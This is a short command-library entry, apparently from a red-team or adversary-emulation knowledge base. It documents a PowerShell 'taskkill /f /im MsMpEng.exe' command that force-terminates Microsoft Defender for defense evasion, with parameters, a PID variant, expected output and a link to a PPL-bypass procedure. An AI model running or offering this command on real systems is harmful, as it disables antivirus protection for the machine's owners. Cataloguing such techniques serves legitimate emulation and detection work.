---
id: b11775aa-a3e6-4587-b325-d1b703f73a26
name: attempt-kill-msmpeng-process
type: command
executor: powershell
data: taskkill /f /im MsMpEng.exe
output: null
created_at: '2023-04-06T03:56:26.592443+00:00'
updated_at: '2023-04-10T20:37:03.731074+00:00'
platforms:
  - Windows
tags:
  - defense-evasion
  - process-termination
verified: true
validated: true
---

# attempt-kill-msmpeng-process

## Command

```powershell
taskkill /f /im MsMpEng.exe
```

## Description

This command attempts to forcefully terminate the Microsoft Defender Antivirus process (MsMpEng.exe), which enforces Protected Process Light for critical system components. Use in defense evasion to impair antivirus protections, though it typically fails on secured systems.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /f | Forcefully terminates the process without prompting | Yes |
| /im MsMpEng.exe | Specifies the image name (process executable) to target | Yes |

## Examples

### Basic Usage

```powershell
taskkill /f /im MsMpEng.exe
```

### Target by PID (Alternative)

```powershell
taskkill /f /pid $_PID
```
(Replace $_PID with the actual process ID from tasklist.)

## Expected Output

On failure (common due to protections):

```
ERROR: The process "MsMpEng.exe" with PID 5784 could not be terminated.
Reason: Access is denied.
```

On success (if protections bypassed):

```
SUCCESS: The process "MsMpEng.exe" with PID 5784 has been terminated.
```

## Related

- [[procedures/Terminate-Microsoft-Defender-to-Bypass-PPL]]
